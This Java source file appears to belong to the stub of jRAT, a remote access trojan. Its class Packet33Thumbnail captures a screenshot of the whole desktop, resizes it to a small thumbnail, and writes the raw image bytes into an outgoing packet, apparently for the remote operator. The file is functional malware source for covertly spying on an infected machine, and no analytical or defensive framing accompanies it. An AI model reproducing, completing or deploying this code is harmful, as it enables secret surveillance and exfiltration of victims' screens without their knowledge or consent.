package pro.jrat.stub.packets.outgoing;

import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;
import java.io.DataOutputStream;

import pro.jrat.common.io.StringWriter;
import pro.jrat.stub.Main;
import pro.jrat.stub.utils.ImageUtils;

public class Packet33Thumbnail extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
		BufferedImage screenShot = Main.robot.createScreenCapture(screenRect);
		screenShot = ImageUtils.resize(screenShot, 150, 100);
		BufferedImage bufferedImage = new BufferedImage(150, 100, BufferedImage.TYPE_3BYTE_BGR);
		bufferedImage.getGraphics().drawImage(screenShot, 0, 0, null);
		byte[] buffer = ((DataBufferByte) bufferedImage.getRaster().getDataBuffer()).getData();
		dos.write(buffer);
	}

	@Override
	public byte getPacketId() {
		return 33;
	}

}
